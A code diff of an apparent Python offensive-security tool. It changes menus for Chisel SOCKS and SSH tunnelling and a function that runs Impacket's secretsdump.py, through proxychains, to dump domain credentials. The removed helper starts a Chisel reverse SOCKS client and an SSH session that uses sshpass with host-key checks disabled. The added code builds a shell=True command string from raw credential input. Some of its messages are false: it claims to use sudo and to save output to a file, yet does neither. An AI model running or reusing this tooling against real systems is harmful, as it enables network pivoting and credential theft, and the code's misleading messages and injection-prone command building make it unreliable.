@@ -7,35 +7,6 @@ from questionary import Style, select
 # Global variable to track if SOCKS Proxy was selected
 use_socks_proxy = False
 
-def proxy_image():
-    # Build the Docker image
-    docker_image = "socks_proxy_image"
-    print("Building the Docker container...")
-    try:
-        subprocess.run(["sudo", "docker", "build", "-t", docker_image, "."], check=True)
-    except subprocess.CalledProcessError as e:
-        print(f"Error occurred while building Docker image: {e}")
-        return
-
-    try:
-        # Start Chisel client in the background and SSH into the target via the SOCKS proxy
-        print("Starting Chisel client and SSH session inside Docker container...")
-        subprocess.run(
-            [
-                "sudo", "docker", "run", "--rm", "-it",
-                docker_image,
-                "bash", "-c",
-                f"chisel client {socks_ip}:{socks_port} R:socks & sleep 5 && sshpass -p '{password}' ssh -o 'StrictHostKeyChecking=no' -o 'UserKnownHostsFile=/dev/null' {username}@{ssh_target_ip} /bin/bash"
-            ],
-            check=True
-        )
-    except subprocess.CalledProcessError as e:
-        print(f"Error occurred while running Chisel or SSH in the container: {e}")
-        return
-
-    print("\033[32m[+] SOCKS Proxy and SSH session completed successfully!\033[0m")
-
-
 def tunneltype():
     global use_socks_proxy
 
@@ -51,7 +22,7 @@ def tunneltype():
         match tunnel_choice:
             case "SOCKS Proxy":
                 socks_ip = input("Enter SOCKS Server IP: ")
-                socks_port = input("Enter SOCKS Server Port: ")
+                socks_port = input("Enter SOCKS Server Port (Default 1080): ")
 
                 # Attempt to connect to the Chisel server
                 try:
@@ -62,12 +33,15 @@ def tunneltype():
                         shell=True,
                         check=True
                     )
+
                     print("\033[32m[+] Successfully connected to Chisel server for redirection.\033[0m")
+
+                    use_socks_proxy = True  # Enable the SOCKS proxy flag
                     return True  # Return True here since the setup is successful
                 except subprocess.CalledProcessError as e:
-                    print("\033[31m[-] Failed to connect to Chisel server. Error:\033[0m", e)
-                    return False  # Return failure status
-#######################################
+                    print("\033[31m[-] Failed to connect to Chisel server or update proxychains.conf. Error:\033[0m", e)
+                    return False
+
             case "SSH Tunnel":
                 ssh_tunnel_ip = input("Enter SSH Tunnel IP: ")
                 ssh_tunnel_port = input("Enter SSH Tunnel Port (default: 22): ").strip() or "22"
@@ -107,7 +81,7 @@ def tunneltype():
                 except Exception as e:
                     print(f"\033[31m[-] Failed to set up SSH tunnel. Error:\033[0m {e}")
                     return False  # Return failure status
-####################################
+
             case "TCP Tunnel":
                 print("TCP Tunnel module is still under development.")
                 return False
@@ -136,47 +110,35 @@ def creds():
     if use_socks_proxy:
         print("\033[32m[+] Using SOCKS Proxy for secretsdump.\033[0m")
         command = [
-            "proxychains",
-            "/usr/local/bin/secretsdump.py",
-            f"'{domain}/{username}:{password}'@{target}",
-            "-outputfile",
-            "secretsdump_output.txt"
+            f"proxychains python /usr/local/bin/secretsdump.py '{domain}/{username}:{password}'@{target} -outputfile secretsdump_output.txt"
         ]
     else:
         command = [
+            "python",
             "/usr/local/bin/secretsdump.py",
             f"'{domain}/{username}:{password}'@{target}",
             "-outputfile",
             "secretsdump_output.txt"
         ]
+
+    # Print the exact command being run
+    print("\033[33m[!] Command to be executed:\033[0m", " ".join(command))
 
     outfile = "secretsdump_output.txt"  # Define your desired output file here
 
     try:
-        # Execute the command and capture output
-        result = subprocess.run(
-            command,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            text=True,
-            check=True
-        )
-
-        # Save stdout to the output file
-        with open(outfile, "w") as output_file:
-            output_file.write(result.stdout)
-
-        # Print success message and the command output
-        print(f"\033[32m[+] Secretsdump completed successfully. Output saved to {outfile}.\033[0m")
+        print("\033[32m[+] Running secretsdump with sudo...\033[0m")
+        result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True, timeout=60)
+        print("\033[32m[+] Secretsdump completed successfully. Output saved to secretsdump_output.txt.\033[0m")
         print("\033[32m[+] Command Output:\033[0m")
         print(result.stdout)
 
-        # Print any warnings or errors
         if result.stderr:
             print("\033[33m[!] Command Warnings or Errors:\033[0m")
             print(result.stderr)
     except subprocess.CalledProcessError as e:
-        print(f"\033[31m[-] Failed to run secretsdump. Error:\033[0m {e.stderr}")
+       print(f"\033[31m[-] Secretsdump failed. Error:\033[0m")
+       print(e.stderr)
 
 def ldap():
     # Placeholder for LDAP domain dump functionality
